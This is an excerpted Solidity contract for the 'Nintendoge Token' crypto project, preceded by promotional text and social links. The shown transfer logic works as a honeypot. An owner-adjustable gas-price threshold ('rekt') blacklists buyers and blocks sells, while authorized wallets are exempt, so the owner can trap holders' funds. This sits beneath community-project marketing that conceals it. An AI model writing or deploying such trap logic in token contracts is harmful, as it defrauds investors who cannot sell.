...
The NINTENDOGE Token is a community driven DeFi cryptocurrency with the aim to become 
one of the most known P2E projects in the Crypto space!

Telegram: https://t.me/NintendogeToken
Website: https://nindoge.net/
Twitter: https://twitter.com/NintendogeToken
...
contract NintendogeToken is Ownable, IBEP20 {
    ...
    string  _name = "Nintendoge Token";
    string  _symbol = "NINDOGE";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x7ed99da73e5D45787b3E95E0Eb4A1c1603B475E3;
        teamFeeReceiver = 0x1a65BBD2C351BFc800D316a13F58972bd6372EE5;
        devFeeReceiver = 0x1a65BBD2C351BFc800D316a13F58972bd6372EE5;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= rekt && recipient != pair) {
            isblacklisted[recipient] = true;
        }

        if (recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= rekt, ">Sell on wallet action"); 
        }
    ...
    function UpdateRekt (uint256 _rekt) public onlyOwner {
        rekt = _rekt * 1 gwei; 
    }
